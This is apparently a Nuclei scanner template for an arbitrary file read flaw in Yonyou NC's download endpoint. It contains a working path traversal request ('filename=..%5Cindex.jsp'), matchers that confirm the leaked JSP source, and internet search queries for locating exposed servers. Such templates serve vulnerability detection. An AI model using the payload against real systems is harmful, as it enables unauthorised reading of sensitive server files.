id: yonyou-nc-download-fileread

info:
  name: 用友NC download文件存在任意文件读取漏洞
  author: Y3y1ng
  severity: high
  description: | 
    用友NC的download文件存在任意文件读取漏洞，攻击者可以利用该漏洞读取服务器上的敏感文件。
    Fofa: app="用友-UFIDA-NC"
    Hunter: web.title="YONYOU NC"
    ZoomEye: app:"Yonyou NC httpd"
  reference:
    - https://mp.weixin.qq.com/s/oVRiOXEG9cxEtyE8q0UKZQ
  tags: 用友-U8,用友-NC-Cloud,Yonyou-UFIDA-NC,Yonyou-U8-Cloud

http:
  - method: GET
    path:
      - "{{BaseURL}}/portal/pt/xml/file/download?pageId=login&filename=..%5Cindex.jsp"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "response.addHeader"
          - "request.getSession"
        part: body